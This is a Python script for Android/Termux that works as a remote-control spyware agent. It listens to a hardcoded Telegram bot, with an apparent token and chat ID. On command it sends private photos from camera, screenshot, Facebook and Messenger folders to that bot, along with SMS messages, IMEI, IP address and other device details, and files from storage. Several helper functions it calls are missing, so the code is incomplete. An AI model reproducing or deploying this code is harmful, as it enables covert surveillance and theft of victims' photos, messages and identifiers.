import os
import requests
import json
import subprocess
from threading import Thread, Event
import time  # Add delay handling

# Replace with your bot token and chat ID
TOKEN = '7409833692:7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Global variable to store current folder path and download state
current_folder = "/storage/emulated/0/"
download_event = Event()  # Event to control the download process

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to download images from specified locations
def download_images():
    global download_event
    locations = [
        "/storage/emulated/0/DCIM/Camera",
        "/storage/emulated/0/DCIM/Facebook",
        "/storage/emulated/0/Pictures/Screenshots",
        "/storage/emulated/0/Pictures/Messenger"
    ]
    downloaded_files = set()  # To keep track of downloaded files

    for location in locations:
        if not os.path.exists(location):
            send_to_telegram(f"Location `{location}` does not exist.")
            continue

        for root, _, files in os.walk(location):
            for file in files:
                if not download_event.is_set():
                    send_to_telegram("Download stopped.")
                    return
                
                if file.lower().endswith(('.jpg', '.png')):
                    file_path = os.path.join(root, file)
                    
                    if file_path in downloaded_files:
                        continue
                    
                    downloaded_files.add(file_path)
                    send_file_to_telegram(file_path)

# Function to get device information
def get_device_info():
    try:
        device_info = {}
        
        # Get device model and name
        device_info['Model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        device_info['Device Name'] = subprocess.check_output(['getprop', 'ro.product.device']).decode().strip()

        # Get Android version
        device_info['Android Version'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()

        # Get IMEI (requires root access)
        try:
            device_info['IMEI'] = subprocess.check_output(['termux-telephony-deviceinfo']).decode().strip()
        except Exception:
            device_info['IMEI'] = "IMEI access denied or requires root."

        # Get battery status
        battery_status = subprocess.check_output(['termux-battery-status']).decode().strip()
        device_info['Battery'] = battery_status

        # Get IP Address using termux command
        try:
            ip_address = subprocess.check_output(['termux-wifi-info']).decode().strip()
            device_info['IP Address'] = ip_address
        except Exception:
            device_info['IP Address'] = "Unable to retrieve IP address."

        # Format the device info for Telegram
        info_message = "\n".join([f"{key}: {value}" for key, value in device_info.items()])
        return info_message
    except Exception as e:
        return f"Error retrieving device info: {str(e)}"

# Function to handle Telegram commands for downloading photos and stopping downloads
def handle_telegram_update(update):
    global download_event
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            if message == "/sms":
                sms_messages = get_sms()
                send_to_telegram(sms_messages)
            
            elif message == "/device":
                device_info = get_device_info()
                send_to_telegram(device_info)

            elif message == "/sdcard":
                global current_folder
                current_folder = "/storage/emulated/0/"
                send_to_telegram(f"Navigating to SD card: `{current_folder}`")
                handle_folder_navigation("")  # Show initial folder contents

            elif message == "/download_photo":
                if not download_event.is_set():
                    send_to_telegram("Starting photo download...")
                    download_event.set()  # Ensure downloading is allowed
                    download_thread = Thread(target=download_images)
                    download_thread.start()
                else:
                    send_to_telegram("Photo download is already in progress.")

            elif message == "/download_photo_stop":
                if download_event.is_set():
                    download_event.clear()  # Stop downloading
                    send_to_telegram("Photo download stopped.")
                else:
                    send_to_telegram("No photo download is in progress to stop.")

            else:
                folder_path = os.path.join(current_folder, message)
                if os.path.isdir(folder_path):
                    handle_folder_navigation(message)
                else:
                    response_message = download_file(message)
                    send_to_telegram(response_message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Function to listen for Telegram updates
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"

    while True:
        try:
            if last_update_id:
                url += f"?offset={last_update_id + 1}"
            response = requests.get(url)
            updates = response.json().get('result', [])

            for update in updates:
                last_update_id = update.get('update_id')
                handle_telegram_update(update)
            
            # Adding a short delay to prevent continuous requests and overloading
            time.sleep(2)

        except Exception as e:
            send_to_telegram(f"Error listening for updates: {str(e)}")
            time.sleep(5)  # In case of an error, wait before retrying

# Start listening for Telegram updates
if __name__ == "__main__":
    listen_for_updates()
